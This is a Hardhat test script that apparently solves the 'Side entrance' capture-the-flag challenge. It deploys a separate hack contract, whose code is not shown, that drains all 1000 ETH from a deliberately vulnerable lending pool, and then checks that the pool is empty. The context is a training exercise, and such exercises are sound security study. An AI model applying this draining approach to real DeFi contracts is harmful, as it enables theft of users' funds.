const { ethers } = require("hardhat");
const { expect } = require("chai");
const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");

describe("[Challenge] Side entrance", function () {
  let deployer, player;
  let pool;

  const ETHER_IN_POOL = 1000n * 10n ** 18n;
  const PLAYER_INITIAL_ETH_BALANCE = 1n * 10n ** 18n;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, player] = await ethers.getSigners();

    // Deploy pool and fund it
    pool = await (
      await ethers.getContractFactory("SideEntranceLenderPool", deployer)
    ).deploy();
    await pool.deposit({ value: ETHER_IN_POOL });
    expect(await ethers.provider.getBalance(pool.address)).to.equal(
      ETHER_IN_POOL
    );

    // Player starts with limited ETH in balance
    await setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
    expect(await ethers.provider.getBalance(player.address)).to.eq(
      PLAYER_INITIAL_ETH_BALANCE
    );
  });

  it("Execution", async function () {
    /** CODE YOUR SOLUTION HERE */
    // 1. Deploy the hack contract
    poolHack = await (
      await ethers.getContractFactory("SideEntranceLenderPoolHack", player)
    ).deploy();
    console.log("Deployed the hack at: ", poolHack.address);

    // 2. Call the hack contract to withdraw all the ETH from the pool
    await poolHack.hack(pool.address);
    console.log("Hacked the pool! :D");

    // 3. Check the balance of the player
    console.log(
      "Player balance: ",
      await ethers.provider.getBalance(player.address)
    );
  });

  after(async function () {
    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

    // Player took all ETH from the pool
    expect(await ethers.provider.getBalance(pool.address)).to.be.equal(0);
    expect(await ethers.provider.getBalance(player.address)).to.be.gt(
      ETHER_IN_POOL
    );
  });
});
